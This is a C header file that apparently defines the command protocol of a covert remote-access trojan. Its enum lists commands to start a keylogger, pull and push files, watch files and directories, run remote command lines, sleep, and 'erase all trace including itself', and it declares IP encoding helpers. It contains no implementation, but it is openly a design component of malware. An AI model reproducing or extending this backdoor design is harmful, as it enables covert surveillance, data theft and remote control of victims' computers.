#ifndef COMMANDS_H
#define COMMANDS_H

#include <stdint.h>

enum command_type {
    CMD_UNINSTALL = 0,              // tell runner to erase all trace including itself

    CMD_REQ_FILE_NAME,              // command to request a file by file name
    REP_REQ_FILE_NAME,              // reply to a request for a file (file name)
    REP_REQ_FILE_DATA,              // reply to a request for a file (data)

    CMD_SEND_FILE_NAME,             // command to send a file (file name)
    CMD_SEND_FILE_DATA,             // command to send a file (data)

    CMD_START_KL,                   // command to start keylogger
    CMD_START_WATCH_FILE,           // command to start watching file
    CMD_START_WATCH_DIR,            // command to start watching dir
    CMD_STOP,                       // command to stop whichever ongoing command it's doing

    CMD_REMOTE_RUN,                 // command to run a command line

    CMD_DISCONNECT                  // command to tell runner to go back to sleep
};

int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4);
int decode_ip(char *buffer, uint8_t *byte1, uint8_t *byte2, uint8_t *byte3, uint8_t *byte4);

#endif //COMMANDS_H
